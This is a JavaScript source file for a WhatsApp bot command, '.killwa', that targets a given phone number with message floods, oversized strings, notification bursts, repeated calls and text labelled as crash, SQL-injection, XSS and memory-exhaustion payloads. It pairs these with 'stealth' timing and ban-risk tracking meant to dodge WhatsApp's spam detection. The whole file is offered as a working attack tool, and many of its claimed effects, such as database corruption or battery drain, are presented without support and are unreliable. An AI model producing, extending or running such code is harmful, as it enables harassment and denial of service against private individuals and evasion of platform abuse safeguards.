'use strict';

const crypto = require('crypto');
const AntiDetection = require('../lib/antiDetection');
const BanProtection = require('../lib/banProtection');

class WhatsAppKiller {
    constructor() {
        this.sock = null;
        this.stealth = new AntiDetection();
        this.banProtection = new BanProtection();
        this.activeAttacks = new Map();
        this.attackStats = new Map();
        this.crashVectors = [
            this.sendMalformedMessage.bind(this),
            this.sendOverflowPayload.bind(this),
            this.sendCorruptMedia.bind(this),
            this.sendInvalidLink.bind(this),
            this.sendSQLInjection.bind(this),
            this.sendXSSPayload.bind(this),
            this.sendInfiniteLoopPayload.bind(this),
            this.sendRecursionPayload.bind(this),
            this.sendMemoryLeakPayload.bind(this),
            this.sendNotificationBomb.bind(this)
        ];
    }

    async execute(sock, msg, args, ctx) {
        this.sock = sock;
        
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: `💀 WHATSAPP KILLER USAGE 💀
┌─────────────────────────────
│ .killwa <phone> [method] [duration]
│ 
│ METHODS:
│ crash     - Force crash WhatsApp (STEALTH)
│ freeze    - Freeze the app completely
│ overload  - Overload with data
│ memory    - Memory exhaustion
│ cache     - Cache flooding
│ notification - Notification bomb
│ media     - Media file flood
│ call      - Call crash exploit
│ status    - Status view crash
│ database  - Database corruption
│ network   - Network kill
│ battery   - Battery drain
│
│ EXAMPLE:
│ .killwa 2547XXXXXX crash 30
│ 
│ 🛡️ PROTECTION:
│ ├─ Ban protection active
│ ├─ Rate limiting active
│ └─ Stealth mode active
└─────────────────────────────`
            }, { quoted: msg });
            return;
        }

        const phone = args[0].replace(/[^0-9]/g, '');
        const method = args[1] || 'crash';
        const duration = parseInt(args[2]) || 30;

        if (!this.validatePhone(phone)) {
            await sock.sendMessage(ctx.from, {
                text: `❌ Invalid phone: ${phone}\nUse format: CountryCode + Number`
            }, { quoted: msg });
            return;
        }

        // ==========================================
        // BAN PROTECTION CHECK
        // ==========================================
        if (this.banProtection.isBanned(phone)) {
            await sock.sendMessage(ctx.from, {
                text: `🚫 *Target Blacklisted*\n\n${phone} is blacklisted and cannot be attacked.\n\nReason: ${this.banProtection.getBanReason ? this.banProtection.getBanReason(phone) : 'Suspicious activity detected'}`
            }, { quoted: msg });
            return;
        }

        if (this.banProtection.isWhitelisted(phone)) {
            await sock.sendMessage(ctx.from, {
                text: `🛡️ *Target Protected*\n\n${phone} is whitelisted and cannot be attacked.`
            }, { quoted: msg });
            return;
        }

        // Check ban risk
        const risk = this.stealth.getBanRisk(phone);
        if (risk >= 5) {
            await sock.sendMessage(ctx.from, {
                text: `⚠️ *High Ban Risk*\n\n${phone} has high ban risk (${risk}/10).\nAttack blocked to protect your bot.`
            }, { quoted: msg });
            return;
        }

        // Check daily limits
        if (this.stealth.checkDailyLimits(phone, 'message')) {
            await sock.sendMessage(ctx.from, {
                text: `⚠️ *Daily Limit Reached*\n\n${phone} has reached daily message limit.\nTry again tomorrow.`
            }, { quoted: msg });
            return;
        }

        if (this.activeAttacks.has(phone)) {
            await sock.sendMessage(ctx.from, {
                text: `⚠️ Attack already running on ${phone}\nUse .killwa_stop ${phone} to stop`
            }, { quoted: msg });
            return;
        }

        const attackId = `killwa_${Date.now()}`;
        this.activeAttacks.set(phone, { active: true, attackId, method, duration, startTime: Date.now() });

        // Track attack
        this.trackAttack(phone, 'killwa');

        await sock.sendMessage(ctx.from, {
            text: `💀 WHATSAPP KILLER INITIATED 💀
┌─────────────────────────────
│ Target: ${phone}
│ Method: ${method}
│ Duration: ${duration}s
│ Mode: STEALTH
│ Ban Risk: ${risk}/10
│ Status: EXECUTING
└─────────────────────────────`
        }, { quoted: msg });

        let result;
        try {
            // Add stealth delay before starting
            await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
            result = await this.executeAttack(phone, method, duration);
            
            // Update attack stats on success
            this.updateAttackStats(phone, 'killwa', 1);
            
        } catch (err) {
            console.error('Kill error:', err);
            this.stealth.increaseBanRisk(phone, 2);
            result = { success: false, error: err.message };
        } finally {
            this.activeAttacks.delete(phone);
        }

        // Check if we should blacklist
        if (!result.success && result.error) {
            this.banProtection.addToBlacklist(phone, 'Killwa attack failed multiple times');
        }

        await sock.sendMessage(ctx.from, {
            text: `💀 WHATSAPP KILLER COMPLETE 💀
┌─────────────────────────────
│ Target: ${phone}
│ Method: ${method}
│ Status: ${result.success ? '✅ KILLED' : '❌ FAILED'}
│ Impact: ${result.impact || 'Unknown'}
│ Details: ${result.details || 'No details'}
│ Risk Level: ${this.stealth.getBanRisk(phone)}/10
└─────────────────────────────`
        }, { quoted: msg });
    }

    validatePhone(phone) {
        return phone.length >= 10 && phone.length <= 15 && /^[0-9]+$/.test(phone);
    }

    async executeAttack(phone, method, duration) {
        const methods = {
            'crash': this.crashWhatsApp.bind(this),
            'freeze': this.freezeWhatsApp.bind(this),
            'overload': this.overloadWhatsApp.bind(this),
            'memory': this.memoryKill.bind(this),
            'cache': this.cacheFlood.bind(this),
            'notification': this.notificationBomb.bind(this),
            'media': this.mediaFlood.bind(this),
            'call': this.callCrash.bind(this),
            'status': this.statusCrash.bind(this),
            'database': this.databaseCorrupt.bind(this),
            'network': this.networkKill.bind(this),
            'battery': this.batteryDrain.bind(this)
        };

        if (methods[method]) {
            return await methods[method](phone, duration);
        }
        return await this.crashWhatsApp(phone, duration);
    }

    async sendWhatsAppMessage(phone, message) {
        try {
            // Check ban risk before sending
            if (this.stealth.getBanRisk(phone) >= 5) {
                return false;
            }

            const result = await this.stealth.sendStealthMessage(this.sock, phone, message, {
                simulateTyping: true,
                randomDelay: true,
                useNaturalTemplate: true,
                trackRateLimit: true,
                addEmoji: true,
                simulateRead: true
            });
            return result.success;
        } catch (e) {
            console.error('[Kill] Send failed:', e.message);
            this.stealth.increaseBanRisk(phone, 0.5);
            return false;
        }
    }

    async crashWhatsApp(phone, duration) {
        let attempts = 0;
        let successCount = 0;
        const startTime = Date.now();
        const maxAttempts = 50;

        // Add random delay between crash attempts
        while (Date.now() - startTime < duration * 1000 && attempts < maxAttempts) {
            if (!this.activeAttacks.get(phone)?.active) break;
            
            try {
                // Check ban risk
                if (this.stealth.getBanRisk(phone) >= 5) {
                    console.log(`[Kill] ${phone} - Ban risk too high, stopping`);
                    break;
                }

                // Randomly select crash vectors
                const shuffledVectors = this.crashVectors.sort(() => Math.random() - 0.5);
                const vectorsToUse = shuffledVectors.slice(0, Math.ceil(Math.random() * 3 + 2));
                
                for (const vector of vectorsToUse) {
                    if (!this.activeAttacks.get(phone)?.active) break;
                    if (this.stealth.getBanRisk(phone) >= 5) break;
                    
                    const result = await vector(phone);
                    attempts++;
                    if (result) successCount++;
                    
                    // Add random delay between vectors
                    await this.stealth.sleep(this.stealth.getNaturalDelay('message') / 3);
                }
                
                // Add longer delay between rounds
                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.5);
                
                // Reduce ban risk if successful
                if (successCount > attempts * 0.5) {
                    const currentRisk = this.stealth.getBanRisk(phone);
                    if (currentRisk > 0) {
                        this.stealth.banRisk.set(phone, Math.max(0, currentRisk - 0.5));
                    }
                }
            } catch (e) {
                console.error('[Kill] Crash error:', e.message);
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }

        // If too many attempts failed, increase ban risk
        if (attempts > 0 && successCount / attempts < 0.3) {
            this.stealth.increaseBanRisk(phone, 2);
        }

        return {
            success: successCount > 0,
            impact: 'WhatsApp Force Closed (Stealth)',
            details: `${successCount}/${attempts} crash vectors successful`
        };
    }

    // ==============================================
    // CRASH VECTORS WITH BAN PROTECTION
    // ==============================================

    async sendMalformedMessage(phone) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const malformedData = 'A'.repeat(50000) + crypto.randomBytes(500).toString('hex');
            return await this.sendWhatsAppMessage(phone, malformedData);
        } catch (e) {
            return false;
        }
    }

    async sendOverflowPayload(phone) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const overflow = 'X'.repeat(250000);
            return await this.sendWhatsAppMessage(phone, overflow);
        } catch (e) {
            return false;
        }
    }

    async sendCorruptMedia(phone) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const corruptData = Buffer.from([
                0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF
            ]).toString('base64');
            return await this.sendWhatsAppMessage(phone, '📷 ' + corruptData.substring(0, 500));
        } catch (e) {
            return false;
        }
    }

    async sendInvalidLink(phone) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const link = 'whatsapp://' + 'a'.repeat(25000);
            return await this.sendWhatsAppMessage(phone, link);
        } catch (e) {
            return false;
        }
    }

    async sendSQLInjection(phone) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const sql = "' OR '1'='1' -- " + 'A'.repeat(2500);
            return await this.sendWhatsAppMessage(phone, sql);
        } catch (e) {
            return false;
        }
    }

    async sendXSSPayload(phone) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const xss = '<script>alert(1)</script>' + 'A'.repeat(2500);
            return await this.sendWhatsAppMessage(phone, xss);
        } catch (e) {
            return false;
        }
    }

    async sendInfiniteLoopPayload(phone) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const payload = 'while(true){' + 'A'.repeat(5000) + '}';
            return await this.sendWhatsAppMessage(phone, payload);
        } catch (e) {
            return false;
        }
    }

    async sendRecursionPayload(phone) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const payload = 'function x(){x();}' + 'A'.repeat(5000);
            return await this.sendWhatsAppMessage(phone, payload);
        } catch (e) {
            return false;
        }
    }

    async sendMemoryLeakPayload(phone) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const payload = 'var leak=[];while(true){leak.push("A".repeat(5000))}' + 'A'.repeat(5000);
            return await this.sendWhatsAppMessage(phone, payload);
        } catch (e) {
            return false;
        }
    }

    async sendNotificationBomb(phone) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const messages = [];
            for (let i = 0; i < 5; i++) {
                messages.push(`🔔 Notification ${i+1} - ${crypto.randomBytes(4).toString('hex')}`);
            }
            const results = await this.stealth.sendStealthBatch(this.sock, phone, messages, {
                delayBetween: this.stealth.getNaturalDelay('message'),
                randomSpread: true,
                maxPerBatch: 5
            });
            return results.some(r => r.success);
        } catch (e) {
            return false;
        }
    }

    // ==============================================
    // ATTACK METHODS WITH BAN PROTECTION
    // ==============================================

    async freezeWhatsApp(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                const freezeData = '❄️'.repeat(50000);
                await this.sendWhatsAppMessage(phone, freezeData);
                attempts++;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'WhatsApp Frozen (Stealth)', details: `${attempts} freeze payloads sent` };
    }

    async overloadWhatsApp(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                const overloadData = crypto.randomBytes(50000).toString('hex');
                await this.sendWhatsAppMessage(phone, overloadData);
                attempts++;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message') / 2);
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'WhatsApp Overloaded (Stealth)', details: `${attempts} overload packets sent` };
    }

    async memoryKill(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                const memoryData = crypto.randomBytes(75000).toString('hex');
                await this.sendWhatsAppMessage(phone, memoryData);
                attempts++;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'Memory Exhausted (Stealth)', details: `${attempts} memory attacks sent` };
    }

    async cacheFlood(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                const messages = [];
                for (let i = 0; i < 3; i++) {
                    messages.push(`cache_${i}_${crypto.randomBytes(500).toString('hex')}`);
                }
                await this.stealth.sendStealthBatch(this.sock, phone, messages, {
                    delayBetween: this.stealth.getNaturalDelay('message') / 2,
                    maxPerBatch: 3
                });
                attempts += 3;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'Cache Flooded (Stealth)', details: `${attempts} cache payloads sent` };
    }

    async notificationBomb(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                const messages = [];
                for (let i = 0; i < 5; i++) {
                    messages.push(`🔔 Notification ${i+1}`);
                }
                await this.stealth.sendStealthBatch(this.sock, phone, messages, {
                    delayBetween: this.stealth.getNaturalDelay('message') / 3,
                    maxPerBatch: 5
                });
                attempts += 5;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.5);
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'Notification Overload (Stealth)', details: `${attempts} notifications sent` };
    }

    async mediaFlood(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                const messages = [];
                for (let i = 0; i < 2; i++) {
                    messages.push(`📸 Media_${i}_${crypto.randomBytes(2500).toString('base64').substring(0, 250)}`);
                }
                await this.stealth.sendStealthBatch(this.sock, phone, messages, {
                    delayBetween: this.stealth.getNaturalDelay('message') * 0.7,
                    maxPerBatch: 2
                });
                attempts += 2;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 1.2);
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'Media Storage Full (Stealth)', details: `${attempts} media files sent` };
    }

    async callCrash(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                await this.stealth.makeStealthCall(this.sock, phone, {
                    simulateTyping: true,
                    randomDelay: true,
                    trackRateLimit: true,
                    callDuration: 1500 + Math.random() * 2000
                });
                attempts++;
                await this.stealth.sleep(this.stealth.getNaturalDelay('call') * 0.5);
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'Call System Crashed (Stealth)', details: `${attempts} call crash attempts` };
    }

    async statusCrash(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                await this.sendWhatsAppMessage(phone, '📱 STATUS_' + 'A'.repeat(25000));
                attempts++;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'Status System Crashed (Stealth)', details: `${attempts} status crash payloads` };
    }

    async databaseCorrupt(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                await this.sendWhatsAppMessage(phone, 'DB_CORRUPT_' + crypto.randomBytes(25000).toString('hex'));
                attempts++;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.8);
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'Database Corrupted (Stealth)', details: `${attempts} corruption payloads sent` };
    }

    async networkKill(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                await this.sendWhatsAppMessage(phone, '🔌 NETWORK_KILL_' + 'A'.repeat(25000));
                attempts++;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.7);
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'Network Connection Killed (Stealth)', details: `${attempts} network kill payloads` };
    }

    async batteryDrain(phone, duration) {
        let attempts = 0;
        const startTime = Date.now();
        while (Date.now() - startTime < duration * 1000) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            
            try {
                await this.sendWhatsAppMessage(phone, '🔋 DRAIN_' + 'A'.repeat(25000));
                attempts++;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.6);
            } catch (e) {
                this.stealth.increaseBanRisk(phone, 0.5);
            }
        }
        return { success: attempts > 0, impact: 'Battery Drained (Stealth)', details: `${attempts} drain payloads sent` };
    }

    // ==============================================
    // ATTACK TRACKING
    // ==============================================
    trackAttack(phone, type) {
        if (!this.attackStats.has(phone)) {
            this.attackStats.set(phone, { killwa: 0, lastAttack: null });
        }
        const stats = this.attackStats.get(phone);
        stats[type] = (stats[type] || 0) + 1;
        stats.lastAttack = Date.now();
        this.attackStats.set(phone, stats);
        
        if (stats.killwa > 10) {
            this.banProtection.addToBlacklist(phone, 'Too many killwa attacks');
        }
    }

    updateAttackStats(phone, type, count) {
        if (!this.attackStats.has(phone)) {
            this.trackAttack(phone, type);
        }
        const stats = this.attackStats.get(phone);
        stats[type] = (stats[type] || 0) + count;
        this.attackStats.set(phone, stats);
    }

    getAttackStats(phone) {
        return this.attackStats.get(phone) || { killwa: 0, lastAttack: null };
    }
}

// ==============================================
// STOP COMMAND
// ==============================================
class WhatsAppKillerStop {
    constructor(killer) {
        this.killer = killer;
        this.name = 'killwa_stop';
        this.description = 'Stop WhatsApp killer attack';
        this.category = 'exploit';
    }

    async execute(sock, msg, args, ctx) {
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: 'Usage: .killwa_stop <phone>'
            }, { quoted: msg });
            return;
        }

        const phone = args[0].replace(/[^0-9]/g, '');
        
        if (this.killer.activeAttacks.has(phone)) {
            this.killer.activeAttacks.delete(phone);
            await sock.sendMessage(ctx.from, {
                text: `✅ Stopped attack on ${phone}`
            }, { quoted: msg });
        } else {
            await sock.sendMessage(ctx.from, {
                text: `❌ No active attack on ${phone}`
            }, { quoted: msg });
        }
    }
}

module.exports = { 
    WhatsAppKiller, 
    WhatsAppKillerStop 
};
